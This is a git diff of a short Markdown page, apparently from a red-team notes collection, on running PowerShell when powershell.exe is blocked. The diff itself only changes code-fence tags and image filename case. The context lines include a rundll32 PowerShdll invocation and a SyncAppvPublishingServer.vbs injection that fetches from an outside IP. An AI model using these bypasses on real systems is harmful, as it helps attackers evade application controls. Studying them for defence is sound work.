@@ -6,7 +6,7 @@ If you run into a situation where powershell.exe is blocked and no strict applic
 
 ## PowerShdll
 
-```text
+```
 rundll32.exe PowerShdll.dll,main
 ```
 
@@ -18,13 +18,13 @@ Note that the same could be achieved with a compiled .exe binary from the same p
 
 Windows 10 comes with `SyncAppvPublishingServer.exe and` `SyncAppvPublishingServer.vbs` that can be abused with code injection to execute powershell commands from a Microsoft signed script:
 
-```text
+```
 SyncAppvPublishingServer.vbs "Break; iwr http://10.0.0.5:443"
 ```
 
-![](../../.gitbook/assets/pwshll-syncappvpublishingserver.png)
+![](../../.gitbook/assets/pwshll-SyncAppvPublishingServer.png)
 
-![](../../.gitbook/assets/pwshll-syncappvpublishingserver.gif)
+![](../../.gitbook/assets/pwshll-SyncAppvPublishingServer.gif)
 
 ## References
 
@@ -33,4 +33,3 @@ SyncAppvPublishingServer.vbs "Break; iwr http://10.0.0.5:443"
 {% embed url="https://safe-cyberdefense.com/malware-can-use-powershell-without-powershell-exe/" %}
 
 {% embed url="https://www.youtube.com/watch?v=7tvfb9poTKg" %}
-
